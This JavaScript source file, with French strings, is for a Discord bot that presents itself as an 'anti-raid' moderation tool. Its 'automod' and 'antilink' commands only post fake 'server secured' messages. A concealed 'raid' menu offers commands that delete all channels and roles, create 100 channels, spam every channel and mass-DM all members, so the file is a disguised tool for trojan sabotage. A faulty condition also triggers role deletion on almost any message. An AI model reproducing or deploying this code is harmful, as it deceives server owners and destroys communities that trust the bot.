const Discord = require('discord.js'),
    { banner } = require('./src/index'),
    client = new Discord.Client(),
    prefix = '*',
    token = "BOT_TOKEN"

client.on('ready', function () {
    banner()
    client.user.setActivity(`${prefix}help`)
})

client.on('message', async function (message) {
    const args = message.content.split(/ +/),
        command = args.shift().toLowerCase()

    try {
        await message.delete()
    } catch(_) {

    }

    if (command === `${prefix}pmeveryone` && message.guild) {
        const messageToSend = args.join(' ')
        for (const member of message.guild.members.cache.array()) {
            if (member.id !== client.user.id && !member.user.bot)
                member.send(messageToSend)
        }
    } else if (command === `${prefix}channels`) {
        const channelName = args.join(' ')
        for (let i = 0; i < 100; i++) {
            try {
                await message.guild.channels.create(
                    channelName,
                    { type: 'text' }
                )
            } catch (e) {
                continue
            }
        }
    } else if (command === `${prefix}spam`) {
        const messageToSend = args.join(' ')
        for (let i = 0; i < 50; i++) {
            try {
                message.channel.send(messageToSend)
            } catch (_) {
                continue
            }
        }
    } else if (command === `${prefix}deletechannels`) {
        const channels = message.guild.channels.cache.array()

        message.channel.send(`Suppression de **${channels.length}** salons!`)

        for (const channel of channels) {
            try {
                setTimeout(channel.delete, 1000 * 3)
            } catch (_) {
                continue
            }
        }
    } else if (`${prefix}deleteroles`) {
        const undeletedRoleID = args.shift(),
            roles = message.guild.roles.cache.array()

        message.channel.send(`Suppression de **${roles.length}** rôles!`)

        for (const role of roles) {
            if ([message.guild.id, undeletedRoleID].includes(role.id)) continue
            try {
                setTimeout(role.delete, 1000 * 3)
            } catch (_) {
                continue
            }
        }
    } else if (command === `${prefix}spmall`) {
        const messageToSend = args.join(' ')
        for (let i = 0; i < 5; i++) {
            for (const channel of message.guild.channels.cache.array()) {
                try {
                    await channel.send(messageToSend)
                } catch (_) {
                    continue
                }
            }
        }
    } else if (command === `${prefix}1help`) {
        const helpEmbed = new Discord.MessageEmbed()
            .setColor('#FF0000')
            .setTitle('Commandes de raid :')
            .setDescription('Ici tu trouveras les meilleurs commandes de raid.')
            .addField(
                "Choco8exe#8725 n'est pas responsables de ce que vous en faites !"
            )
            .addField(
                'Commandes',
                `
                \`${prefix}1help\` - Afficher les commandes raid \
                \`${prefix}deletechannels\` - Supprime tous les salons \
                \`${prefix}deleteroles\` - Supprime tous les rôles \
                \`${prefix}channels [Nom]\` - Crée 100 salons avec le nom choisis \
                \`${prefix}spam [Message]\` - Spams envoyés dans le salon \
                \`${prefix}spmall [Message]\` - Spammer dans tout les salons en même temps \
                \`${prefix}pmeveryone [Message]\` - DM tout les membres du serveur
                `,
                true
            )
            .setTimestamp()
            .setFooter('Créé par choco')
        message.author.send(helpEmbed)
    } else if (command === `${prefix}help`) {
        const helpEmbed = new Discord.MessageEmbed()
            .setColor('#FF0000')
            .setTitle('commande anti-raid')
            .setURL('https://github.com/choco8exe')
            .setDescription('Ici vous pouvez trouver toutes les commandes')
            .addField(
                'Commandes Admin',
                `
                \`${prefix}help\` - Afficher les commandes \
                \`${prefix}1help\` - Afficher les commandes de raid \
                \`${prefix}automod\` - Activer l'automod sur votre serveur \
                \`${prefix}antilink\` - Activer l'anti-link sur votre serveur \
                `
            )
            .setTimestamp()
            .setFooter('Créé par choco')
        message.channel.send(helpEmbed)
    } else if (command === `${prefix}automod`) {
        const embed = new Discord.MessageEmbed()
            .setColor('#FF0000')
            .setDescription(
                ":white_check_mark: **L'automod à bien été activer, votre serveur est maintenant sécurisé.**"
            )
        message.channel.send(embed)
    } else if (command === `${prefix}antilink`) {
        const embed = new Discord.MessageEmbed()
            .setColor('#FF0000')
            .setDescription(
                ":white_check_mark: **L'anti-link à bien été activer, votre serveur est maintenant sécurisé des invitations discord.**"
            )
        message.channel.send(embed)
    }
})

client.login(token)